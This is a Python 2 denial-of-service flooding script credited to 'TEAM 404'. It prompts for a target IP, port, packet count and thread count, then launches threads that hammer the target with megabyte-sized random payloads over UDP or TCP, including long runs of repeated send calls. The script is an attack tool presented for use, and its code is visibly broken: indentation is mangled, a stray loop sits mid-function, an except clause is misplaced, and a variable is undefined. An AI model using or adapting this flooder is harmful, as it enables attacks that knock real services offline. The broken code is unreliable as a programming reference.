import sys
import os
import time
import socket
import threading
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# by ronaldo Zhack TEAM 404
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1000000)
timeout =  time.time() 
# TEAM 404

os.system ("clear")
print ('''
\033[91m
                          \033[92m[\033[91mPowered By : Ronaldo TEAM  : 404\033[92m]
                               \033[93m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
''')
ip = raw_input("IP Address : ")
port = input("Port       : ")
times = input("Packets  : ")
threads = input("Threads : ")
os.system("clear")
print "\033[91mTEAM 404 BY Zhack RONALDO DDOS"
print "\033[91m[                    ] 0% "
time.sleep(3)
print "\033[92m[=====               ] 20%"
time.sleep(3)
print "\033[92m[==========          ] 30%"
time.sleep(3)
print "\033[92m[===============     ] 45%"
time.sleep(3)
print "\033[92m[===============     ] 70%"
time.sleep(3)
print "\033[92m[====================] 100%"
time.sleep(2)
os.system ("clear")
def run():
	data = random._urandom(1000000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sent = 79
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
		 addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent")
		except:
			print("[!] Error")
def run2():
	data = random._urandom(1000000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			for x in range(times):
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
			print(i +" OMO TNEKT!!!")
			except:
			s.close()
			print("TEAM 404 DDOS Attack " + ip)

for y in range(threads):
	if choice == "y":
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
